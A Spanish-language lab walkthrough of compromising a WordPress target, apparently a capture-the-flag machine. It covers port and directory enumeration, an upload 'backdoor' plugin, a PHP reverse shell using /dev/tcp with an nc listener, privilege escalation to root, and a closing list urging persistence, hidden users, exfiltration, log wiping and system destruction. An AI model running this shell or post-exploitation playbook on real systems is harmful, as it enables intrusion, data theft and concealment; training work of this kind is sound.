# Escalada de privilegios en entorno WordPress

---

## 1. 📡 Comprobación de Conectividad

```bash
ping 172.17.0.2
```

---

## 2. 🔍 Escaneo de Puertos Abiertos

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2
```

**Puertos abiertos detectados:**

| Puerto   | Servicio |
|----------|----------|
| 80/tcp   | HTTP     |

---

## 3. 🔎 Detección de Versiones de Servicios

```bash
nmap -p80 -sCV 172.17.0.2
```

**Resultados:**

| Puerto   | Servicio                                  |
|----------|-------------------------------------------|
| 80/tcp   | Apache httpd 2.4.58 (Ubuntu)              |

---

## 4. 📁 Enumeración de Directorios vía HTTP

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt
```

**Rutas relevantes encontradas:**

```
/index.php            → Redirecciona a raíz del sitio
/wp-admin             → Panel de administración WordPress
/wp-content           → Contenido de WordPress
/wp-includes          → Archivos core de WordPress
/xmlrpc.php           → Redirecciona a http://devil.lab
```

---

## 5. 📂 Exploración en profundidad: `wp-content`

```bash
gobuster dir -u http://devil.lab/wp-content -w /usr/share/wordlists/dirb/common.txt
```

**Directorios detectados:**

```
/plugins              → http://devil.lab/wp-content/plugins/
/themes               → http://devil.lab/wp-content/themes/
/uploads              → http://devil.lab/wp-content/uploads/
```

---

## 6. 🔬 Exploración: `plugins`

```bash
gobuster dir -u http://devil.lab/wp-content/plugins -w /usr/share/wordlists/dirb/common.txt
```

**Ruta interesante:**

```
/backdoor             → http://devil.lab/wp-content/plugins/backdoor/
```

---

## 7. 🚪 Acceso a `/backdoor`

Se puede acceder y se permite **subida de archivos**. Al enumerar su contenido:

```
/uploads              → Directorio accesible para ejecución de archivos
/index.php            → Tamaño: 2135 bytes (posiblemente panel de subida)
```

---

## 8. 🐚 Reverse Shell

Creamos una **reverse shell** con el siguiente código en `shell.php`:

```php
<?php
system("/bin/bash -c 'bash -i >& /dev/tcp/172.17.0.1/1234 0>&1'");
?>
```

Luego, accedemos a el archivo desde el navegador con 

```bash
nc -lvnp 1234
```

obtenemos acceso como el usuario:

```
www-data
```

---

## 9. 👥 Enumeración de Usuarios

Ubicación: `/home`

```
lucas/
andy/ ✅
ubuntu/
```

Tenemos acceso al usuario `andy`.

---

## 10. 📜 Revisión de Historial

```bash
cat /home/andy/.bash_history
```

Descubrimos un directorio oculto:

```
.secrets/
```

**Contenido:**

- `escalate.c`
- `ftpserver` (binario)

Al ejecutar el binario:

```bash
./ftpserver
```

Obtenemos acceso como **lucas**.

---

## 11. 🎮 Escalada desde `lucas` a `root`

En `/home/lucas/.game` encontramos:

- `game.c`
- `EligeOMuere` (binario)

Revisamos el código fuente:

```c
// Número hardcodeado: 7
// Si aciertas, obtienes shell como root
```

Ejecutamos:

```bash
./EligeOMuere
```

✅ **Obtenemos acceso root**

---

## 12. 🔧 Post-Explotación

Con acceso como root se recomienda:

- ✅ **Persistencia:** agregar usuarios o cron jobs
- 👤 Crear usuarios ocultos
- 🔐 Añadir claves públicas SSH
- 📦 Exfiltrar información sensible
- 🌐 Explorar la red interna
- 🔀 Pivoting hacia otras máquinas
- 🧹 Borrado de logs y huellas
- ⚠️ Destrucción del sistema (sólo en entornos de prueba)

